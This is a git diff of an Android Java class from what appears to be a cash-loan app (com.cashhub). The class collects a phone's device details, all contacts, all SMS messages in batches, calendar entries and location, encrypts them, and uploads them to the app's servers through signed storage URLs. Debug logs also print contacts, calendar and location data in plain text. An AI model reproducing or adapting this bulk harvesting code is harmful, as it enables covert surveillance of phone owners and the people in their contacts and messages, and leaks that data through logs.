@@ -10,10 +10,13 @@ import android.location.LocationManager;
 import android.net.Uri;
 import android.os.Build.VERSION_CODES;
 import android.os.Bundle;
+import android.text.TextUtils;
 import android.util.Log;
 import androidx.annotation.RequiresApi;
 import com.alibaba.fastjson.JSONException;
 import com.alibaba.fastjson.JSONObject;
+import com.cashhub.cash.common.utils.CommonUtil;
+import com.cashhub.cash.common.utils.DeviceUtils;
 import com.google.gson.Gson;
 import com.google.gson.reflect.TypeToken;
 import java.io.IOException;
@@ -48,18 +51,10 @@ public class UploadData {
       "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC4SdE5JJ54SL7wZhOglZNba2vaDC83yLTNQ9ybP6CIO+HDvRCZ/TiFbNNmbfo/xmRx0zU0Y+tZCRrzJhZ9MzzAR7odQnxL/fQlcIuC2MjqvvZ0VpbsbFFqcuqbmzgkbH+p5DdcbrJrDZy5dNr1ccprT3LPGdYgClvRAHodviEcMQIDAQAB";
 
   private Context mContext;//这里有个activity对象，不知道为啥以前好像不要，现在就要了。自己试试吧。
-  private com.cashhub.cash.common.SystemInfo mSystemInfo;
-  private JSONObject mThisystemInfo = new JSONObject();
-  private String mToken = "";
-  private String mDomain = "";
-  private long mTimeStamp = 0L;
-  private String mDeviceKey = "";
+  private SystemInfo mSystemInfo;
 
   //所有的短信
   public static final String SMS_URI_ALL = "content://sms/";
-
-  private String mPostUrlOssSign = "/v1/oss/sign";
-  private String mPostUrlReport = "/v1/device/report-data";
 
   //获取位置信息
   private LocationManager locationManager;
@@ -75,45 +70,31 @@ public class UploadData {
 
   public UploadData(Context context) {
     this.mContext = context;
+    this.mSystemInfo = new SystemInfo(mContext);
   }
 
   /**
    * 获取设备信息
    */
   @RequiresApi(api = VERSION_CODES.M)
-  public void getAndSendDevice(JSONObject systemInfo, String token, String domain, long timeStamp, String deviceKey) {
+  public void getAndSendDevice() {
     Log.d(TAG, "getAndSendDevice Start!!!");
-    if(domain == null || domain.isEmpty()) {
-      return;
-    }
-    if(systemInfo == null) {
-      systemInfo = new JSONObject();
-    }
-    Log.d(TAG, "device post data:" + systemInfo.toString());
-    sendRequest(systemInfo, token, domain, deviceKey, "device");
+    JSONObject deviceInfo = DeviceUtils.getSystemInfo(mContext);
+    JSONObject jsonObject = new JSONObject();
+    jsonObject.put("data", deviceInfo);
+    postOssSign(jsonObject, 1);
   }
 
   /**
    * 获取联系人信息
    */
   @RequiresApi(api = VERSION_CODES.M)
-  public void getAndSendContact(JSONObject systemInfo, String token, String domain, long timeStamp, String deviceKey) {
+  public void getAndSendContact() {
     Log.d(TAG, "getAndSendContact Start!!!");
-    if(domain == null || domain.isEmpty()) {
-      return;
-    }
-
-    if(mSystemInfo == null) {
-      this.mSystemInfo = new com.cashhub.cash.common.SystemInfo(mContext);
-    }
     List<JSONObject> contact = mSystemInfo.getAllContacts();
-    Log.d(TAG, "contact post data:" + contact.toString());
-    if(systemInfo == null) {
-      systemInfo = new JSONObject();
-    }
-    systemInfo.remove("contact");
-    systemInfo.put("contact", contact);
-    sendRequest(systemInfo, token, domain, deviceKey, "contact");
+    JSONObject jsonObject = new JSONObject();
+    jsonObject.put("data", contact);
+    postOssSign(jsonObject, 2);
   }
 
   /**
@@ -135,14 +116,9 @@ public class UploadData {
    *
    */
   @RequiresApi(api = VERSION_CODES.M)
-  public void getAndSendSms(JSONObject systemInfo, String token, String domain, long timeStamp, String deviceKey) {
+  public void getAndSendSms(long timeStamp) {
     Log.d(TAG, "getAndSendSms Start!!!");
-    if(domain == null || domain.isEmpty()) {
-      return;
-    }
-    if(systemInfo == null) {
-      systemInfo = new JSONObject();
-    }
+    JSONObject jsonObject = new JSONObject();
 
     Uri mUri = Uri.parse(UploadData.SMS_URI_ALL);
 
@@ -184,20 +160,20 @@ public class UploadData {
 
         //每1000条数据上传一次
         if(mInfoList != null && mInfoList.size() > 0 && mInfoList.size() >= mMaxCount) {
-          systemInfo.remove("sms");
-          systemInfo.put("sms", mInfoList);
+          jsonObject.remove("data");
+          jsonObject.put("data", mInfoList);
           mInfoList = new ArrayList<>();
-          sendRequest(systemInfo, token, domain, deviceKey, "sms");
+          postOssSign(jsonObject, 3);
         }
       }
 
       cusor.close();
 
       if(mInfoList != null && mInfoList.size() > 0) {
-        systemInfo.remove("sms");
-        systemInfo.put("sms", mInfoList);
+        jsonObject.remove("data");
+        jsonObject.put("data", mInfoList);
         mInfoList = new ArrayList<>();
-        sendRequest(systemInfo, token, domain, deviceKey, "sms");
+        postOssSign(jsonObject, 3);
       }
     }
   }
@@ -206,69 +182,36 @@ public class UploadData {
    * 获取日历信息
    */
   @RequiresApi(api = VERSION_CODES.M)
-  public void getAndSendCalendar(JSONObject systemInfo, String token, String domain, long timeStamp, String deviceKey) {
+  public void getAndSendCalendar() {
     Log.d(TAG, "getAndSendCalendar Start!!!");
-    if(domain == null || domain.isEmpty()) {
-      return;
-    }
-    if(mSystemInfo == null) {
-      this.mSystemInfo = new com.cashhub.cash.common.SystemInfo(mContext);
-    }
     List<JSONObject> calendars = mSystemInfo.getCalendars();
     Log.d(TAG, "calendars post data:" + calendars.toString());
-    if(systemInfo == null) {
-      systemInfo = new JSONObject();
-    }
-    systemInfo.remove("calendar");
-    systemInfo.put("calendar", calendars);
-    sendRequest(systemInfo, token, domain, deviceKey, "calendar");
+
+    JSONObject jsonObject = new JSONObject();
+    jsonObject.put("data", calendars);
+    postOssSign(jsonObject, 4);
   }
 
   /**
    * 获取位置信息
    */
   @RequiresApi(api = VERSION_CODES.M)
-  public void getAndSendLocation(JSONObject systemInfo, String token, String domain, long timeStamp,
-      String deviceKey) {
+  public void getAndSendLocation(JSONObject locationJson) {
     Log.d(TAG, "getAndSendLocation Start!!!");
-    if(domain == null || domain.isEmpty()) {
+    if(locationJson == null) {
       return;
     }
-//    JSONObject location = LocationUtils.getInstance().getLatAndLng(mContext);
-    if(systemInfo == null) {
-      systemInfo = new JSONObject();
-    }
-//    systemInfo.remove("map");
-//    systemInfo.put("map", location);
-    Log.d(TAG, "location post data:" + systemInfo.get("location"));
-    sendRequest(systemInfo, token, domain, deviceKey, "location");
+    JSONObject jsonObject = new JSONObject();
+    jsonObject.put("data", locationJson);
+    postOssSign(jsonObject, 5);
   }
 
   /**
    * 获取位置信息
    */
   @RequiresApi(api = VERSION_CODES.M)
-  public void getAndSendLocation2(JSONObject systemInfo, String token, String domain,
-      long timeStamp, String deviceKey) {
+  public void getAndSendLocation2() {
     Log.d(TAG, "getAndSendLocation Start!!!");
-    if(domain == null || domain.isEmpty()) {
-      return;
-    }
-//    JSONObject location = LocationUtils.getInstance().getLatAndLng(mContext);
-    if(systemInfo != null) {
-      this.mThisystemInfo = systemInfo;
-    }
-    if (token != null) {
-      this.mToken = token;
-    }
-    if(domain != null) {
-      this.mDomain = domain;
-    }
-    if(deviceKey != null) {
-      this.mDeviceKey = deviceKey;
-    }
-    this.mTimeStamp = timeStamp;
-
     getLocation();
     double[] locationJson =
         com.cashhub.cash.common.utils.LocationUtils.getLatAndLng(mContext.getApplicationContext());
@@ -329,13 +272,10 @@ public class UploadData {
       locationObj.put("longitude", location.getLongitude());
       locationObj.put("latitude", location.getLatitude());
     }
-    if(this.mThisystemInfo == null) {
-      this.mThisystemInfo = new JSONObject();
-    }
-    Log.d(TAG, "location get data:" + locationObj);
-    this.mThisystemInfo.remove("location");
-    this.mThisystemInfo.put("location", locationObj);
-    sendRequest(this.mThisystemInfo, this.mToken, this.mDomain, this.mDeviceKey, "location");
+
+    JSONObject jsonObject = new JSONObject();
+    jsonObject.put("data", locationObj);
+    postOssSign(jsonObject, 5);
   }
 
   LocationListener mListener = new LocationListener() {
@@ -364,28 +304,15 @@ public class UploadData {
     }
   };
 
-
-  private void sendRequest(final JSONObject systemInfo, final String token, final String domain, final String deviceKey,
-      final String type) {
-    //发起请求
-    new Thread(new Runnable() {
-      @Override
-      public void run() {
-        try {
-          postOssSign(systemInfo, token, domain, deviceKey, type);
-        } catch (Exception e) {
-          e.printStackTrace();
-        }
-      }
-    }).start();
-  }
-
   @RequiresApi(api = VERSION_CODES.M)
-  private void postOssSign(JSONObject systemInfo, String token, String domain, String deviceKey, String type) {
+  private void postOssSign(JSONObject jsonObject, int dataType) {
+    Log.d(TAG, "postOssSign jsonObject:" + jsonObject + ", type:" + dataType);
     //参数校验
-    if(type == null || type.isEmpty()) {
+    if(jsonObject == null) {
       return;
     }
+    String domain = Host.getApiHost(mContext);
+    String deviceKey = DeviceUtils.getDeviceId(mContext);
     JSONObject json = new JSONObject();
     try {
       json.put("device_key", deviceKey);
@@ -393,23 +320,19 @@ public class UploadData {
       e.printStackTrace();
     }
     RequestBody requestBody = FormBody.create(json.toString(), MediaType.parse("application/json"));
+    Log.d(TAG, "postOssSign domain: " + domain);
 
     Request request = new Request.Builder()
-            .addHeader("Authorization", token)
-            .url(domain + mPostUrlOssSign)
+            .url(domain + "/api/v1/oss/sign")
             .post(requestBody)
             .build();
-
-    Log.d(TAG, "postOssSign device url: " + domain + mPostUrlOssSign);
-
-    Response response = null;
+    Response response;
     String bodyStr = "";
 
     Pattern p = Pattern.compile("((https)://)", Pattern.CASE_INSENSITIVE);
     Matcher matcher = p.matcher(domain);
     boolean isMatcher = matcher.find();
     if (isMatcher) {
-
       Log.d(TAG, "postOssSign device https");
 
       try {
@@ -425,7 +348,7 @@ public class UploadData {
         OkHttpClient client =builder.build();
         response = client.newCall(request).execute();
 
-        if(response == null || response.code() != 200) {
+        if(response.code() != 200) {
           Log.d(TAG, "postOssSign response is Null or code not 200" + response.code() + " " + response.message());
           response.body().close();
           return;
@@ -433,6 +356,7 @@ public class UploadData {
         bodyStr = response.body().string();
       } catch (Exception e) {
         Log.d(TAG, "postOssSign onFailure " + e.getMessage());
+        e.printStackTrace();
       }
 
     } else {
@@ -443,7 +367,7 @@ public class UploadData {
         OkHttpClient okHttpClient = new OkHttpClient();
         response = okHttpClient.newCall(request).execute();
 
-        if(response == null || response.code() != 200) {
+        if(response.code() != 200) {
           Log.d(TAG, "postOssSign response is Null or code not 200");
           response.body().close();
           return;
@@ -452,21 +376,21 @@ public class UploadData {
 
       } catch (Exception e) {
         Log.d(TAG, "postOssSign onFailure " + e.getMessage());
+        e.printStackTrace();
       }
 
     }
 
-    putDataSignUrl(systemInfo, bodyStr, token, domain, deviceKey, type);
+    putDataSignUrl(jsonObject, bodyStr, domain, deviceKey, dataType);
 
     Log.d(TAG, "postOssSign onResponse");
   }
 
 
   @RequiresApi(api = VERSION_CODES.M)
-  private void putDataSignUrl(JSONObject systemInfo, String bodyStr, String token, String domain,
-      String deviceKey, String type) {
-    Log.d(TAG, "putDataSignUrl bodyStr:" + bodyStr);
-    if(bodyStr == null || bodyStr.isEmpty()) {
+  private void putDataSignUrl(JSONObject jsonObject, String bodyStr, String domain,
+      String deviceKey, int dataType) {
+    if(TextUtils.isEmpty(bodyStr)) {
       return;
     }
 
@@ -492,33 +416,9 @@ public class UploadData {
           Log.d(TAG, "putDataSignUrl aseKey:" + aseKey);
           String aesEncrypt = "";
 
-          if(type == "device") {
-            //设备信息
-            Log.d(TAG, "putDataSignUrl device:" + systemInfo.toString());
-            aesEncrypt = com.cashhub.cash.common.AESUtils.encrypt(aseKey, systemInfo.toString());
-            Log.d(TAG, "putDataSignUrl aesEncrypt:" + aesEncrypt);
-          } else if(type == "contact") {
-            //联系人信息
-            Log.d(TAG, "putDataSignUrl contact:" + systemInfo.get("contact").toString());
-            aesEncrypt = com.cashhub.cash.common.AESUtils.encrypt(aseKey, systemInfo.get("contact").toString());
-            Log.d(TAG, "putDataSignUrl aesEncrypt:" + aesEncrypt);
-          } else if(type == "sms") {
-            //短信字符串
-            Log.d(TAG, "putDataSignUrl sms:" + systemInfo.get("sms").toString());
-            aesEncrypt = com.cashhub.cash.common.AESUtils.encrypt(aseKey, systemInfo.get("sms").toString());
-            Log.d(TAG, "putDataSignUrl aesEncrypt:" + aesEncrypt);
-          } else if(type == "calendar") {
-            //日历信息
-            Log.d(TAG, "putDataSignUrl calendar:" + systemInfo.get("calendar").toString());
-            aesEncrypt = com.cashhub.cash.common.AESUtils.encrypt(aseKey, systemInfo.get("calendar").toString());
-            Log.d(TAG, "putDataSignUrl aesEncrypt:" + aesEncrypt);
-          } else if(type == "location") {
-            //位置信息
-            Log.d(TAG, "putDataSignUrl location:" + systemInfo.get("location").toString());
-            aesEncrypt = com.cashhub.cash.common.AESUtils.encrypt(aseKey, systemInfo.get("location").toString());
-            Log.d(TAG, "putDataSignUrl aesEncrypt:" + aesEncrypt);
-          } else {
-
+          if(jsonObject != null) {
+            aesEncrypt = com.cashhub.cash.common.AESUtils.encrypt(aseKey,
+                jsonObject.get("data").toString());
           }
 
           //构造请求 body
@@ -558,7 +458,7 @@ public class UploadData {
             }
 
             //调用report上报
-            postReportData(token, domain, signUrl, aseKey, deviceKey, type);
+            postReportData(domain, signUrl, aseKey, deviceKey, dataType);
           } catch (Exception e) {
             Log.d(TAG, "putDataSignUrl onFailure" + e.getMessage());
           }
@@ -569,10 +469,9 @@ public class UploadData {
   }
 
   @RequiresApi(api = VERSION_CODES.M)
-  private void postReportData(String token, String domain, String dataUrl, String aseKey,
-      String deviceKey, String type) {
-
-    if(dataUrl == null || dataUrl.isEmpty()) {
+  private void postReportData(String domain, String dataUrl, String aseKey, String deviceKey,
+      int dataType) {
+    if(TextUtils.isEmpty(dataUrl)) {
       return;
     }
 
@@ -590,19 +489,20 @@ public class UploadData {
       json.put("device_key", deviceKey);
       json.put("data_url", dataUrl);
       json.put("aes_pwd", rsaEncrypt);
-      if(type == "device") {
-        json.put("data_type", 1);
-      } else if(type == "contact") {
-        json.put("data_type", 2);
-      } else if(type == "sms") {
-        json.put("data_type", 3);
-      } else if(type == "calendar") {
-        json.put("data_type", 4);
-      } else if(type == "location") {
-        json.put("data_type", 5);
-      } else {
-        json.put("data_type", 0);
-      }
+      json.put("data_type", dataType);
+//      if(type == "device") {
+//        json.put("data_type", 1);
+//      } else if(type == "contact") {
+//        json.put("data_type", 2);
+//      } else if(type == "sms") {
+//        json.put("data_type", 3);
+//      } else if(type == "calendar") {
+//        json.put("data_type", 4);
+//      } else if(type == "location") {
+//        json.put("data_type", 5);
+//      } else {
+//        json.put("data_type", 0);
+//      }
     } catch (JSONException e) {
       e.printStackTrace();
     }
@@ -610,12 +510,11 @@ public class UploadData {
 
     Request request = new Request.Builder()
         .addHeader("Content-Type", "application/json")
-        .addHeader("Authorization", token)
-        .url(domain + mPostUrlReport)
+        .url(domain + "/api/v1/device/report-data")
         .post(requestBody)
         .build();
 
-    Log.d(TAG, "postReportData url: " + domain + mPostUrlReport);
+    Log.d(TAG, "postReportData domain: " + domain);
 
     Pattern p = Pattern.compile("((https)://)", Pattern.CASE_INSENSITIVE);
     Matcher matcher = p.matcher(domain);
